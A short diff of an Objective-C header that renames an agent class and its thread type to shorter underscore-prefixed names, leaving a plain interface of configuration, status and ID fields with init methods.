@@ -17,9 +17,9 @@
 
 @end
 
-@interface RCSIAgent : NSObject
+@interface _i_Agent : NSObject
 {
-  RCSIThread  *mThread;
+  _i_Thread  *mThread;
   NSData      *mAgentConfiguration;
   u_int       mAgentStatus;
   u_int       mAgentID;
@@ -27,7 +27,7 @@
 
 @property (retain, readwrite) NSData *mAgentConfiguration;
 @property (readwrite)         u_int   mAgentID;
-@property (readwrite, retain) RCSIThread *mThread;
+@property (readwrite, retain) _i_Thread *mThread;
 
 - (id)init;
 - (id)initWithConfigData:(NSData*)aData;
